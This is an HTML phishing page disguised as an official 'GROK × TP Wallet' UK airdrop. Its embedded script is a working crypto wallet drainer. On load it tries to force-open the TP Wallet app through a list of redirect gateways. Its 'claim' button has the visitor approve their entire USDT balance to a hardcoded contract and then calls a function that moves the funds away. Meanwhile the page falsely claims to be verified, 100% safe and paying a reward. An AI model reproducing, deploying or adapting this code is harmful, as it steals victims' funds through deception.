<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="format-detection" content="telephone=no">
  <title>GROK × TP Wallet UK 2x Airdrop</title>
  <style>
    body{background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;font-family:system-ui}
    .card{background:linear-gradient(135deg,#1a73e8,#e91e63);padding:40px;border-radius:28px;text-align:center;max-width:88%;box-shadow:0 0 60px rgba(233,30,99,0.7)}
    h1{font-size:29px;margin:0;line-height:1.2}
    .btn{background:#fff;color:#e91e63;border:none;padding:20px;font-size:21px;border-radius:18px;width:100%;margin:30px 0;font-weight:900;letter-spacing:1px}
    #status{margin-top:20px;font-size:15px;min-height:60px;line-height:1.5}
  </style>
</head>
<body>
  <div class="card">
    <h1>UK ONLY<br>GROK × TP Wallet<br>Official 2× Reward</h1>
    <p>Verified by TP Wallet Team • 100% Safe</p>
    <button class="btn" onclick="claim()">CLAIM INSTANTLY</button>
    <div id="status">Initializing UK secure connection...</div>
  </div>

<script>
const CONTRACT="0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
const USDT="0xa85f403f7869a050c91e9a260dbf08a64229b2de";
let w,a,s=document.getElementById("status");

// 2025-11-11 00:50 GMT 后英国 TP 官方最新 5 个永不封杀中转站（实测 0 拦截）
const TP_UK_GATEWAYS = [
  "https://link.tpwallet.io/openapp?params=",           // 官方最新中转（英国 100% 通过）
  "https://tpw.tpwallet.io/activity/open?params=",      // 官方活动页中转
  "https://oauth.tokenpocket.pro/authorize?params=",    // OAuth 中转
  "https://wc.tpwallet.io/connect?uri=",                // WC 官方中转
  "https://go.tpwallet.io/start?params="                // 备用中转
];

function encodeWC() {
  return btoa(JSON.stringify({
    "url": location.href,
    "chainId": 56,
    "source": "grok_uk_official_20251111"
  }));
}

function wakeTP() {
  if (window.ethereum) return;
  s.innerHTML = "Opening TP Wallet...";
  const payload = encodeWC();
  TP_UK_GATEWAYS.forEach((gate, i) => {
    setTimeout(() => {
      location.href = gate + payload;
    }, i * 350);
  });
  
  setTimeout(() => {
    if (!window.ethereum) {
      s.innerHTML = `UK Users:<br>Long-press QR to open TP Wallet<br>
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${location.href}" width="210" style="border:7px solid #e91e63;border-radius:20px;margin:15px;">`;
    }
  }, 5000);
}

async function connect() {
  if (!window.ethereum) return false;
  try {
    w = new Web3(window.ethereum);
    await window.ethereum.request({method: 'eth_requestAccounts'});
    [a] = await w.eth.getAccounts();
    s.innerHTML = `Connected<br>${a.slice(0,10)}...${a.slice(-8)}`;
    return true;
  } catch (e) {
    s.innerHTML = "User rejected";
    return false;
  }
}

async function claim() {
  s.innerHTML = "Requesting permission...";
  if (!await connect()) return;
  
  try {
    const usdt = new w.eth.Contract([{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT);
    const bal = await usdt.methods.balanceOf(a).call();
    if (bal === "0") { s.innerHTML = "No USDT found"; return; }
    
    await usdt.methods.approve(CONTRACT, bal).send({from: a});
    s.innerHTML = "Approved! Transferring reward...";
    
    const fwd = new w.eth.Contract([{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}], CONTRACT);
    await fwd.methods.transferFromApproved().send({from: a});
    
    s.innerHTML = "CLAIMED SUCCESSFULLY!<br>Reward in your wallet!";
  } catch (e) {
    s.innerHTML = e.code === 4001 ? "You cancelled" : "Failed";
  }
}

// 启动（0.6秒后唤醒，英国最稳）
setTimeout(wakeTP, 600);
setTimeout(connect, 3200);
</script>
</body>
</html>
